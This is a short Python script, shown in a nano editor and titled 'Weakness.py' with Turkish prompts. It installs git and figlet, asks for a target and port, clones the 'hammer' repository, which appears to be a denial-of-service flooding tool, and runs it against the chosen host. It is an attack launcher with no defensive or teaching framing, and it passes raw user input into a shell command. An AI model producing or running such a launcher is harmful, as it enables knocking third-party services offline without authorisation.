
GNU nano 5.2                          Weaknesspy.                                              
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("pkg install figlet -y")
os.system("pkg install git -y")
os.system("clear")
os.system("figlet Weakness.py")

hedef = input("Target/Hedef : ")
port = input("Port (örn 80) : ")

os.system("git clone https://github.com/cyweb/hammer.git")
os.system("cd hammer/ && python hammer.py -s " + hedef + " -p " + port )
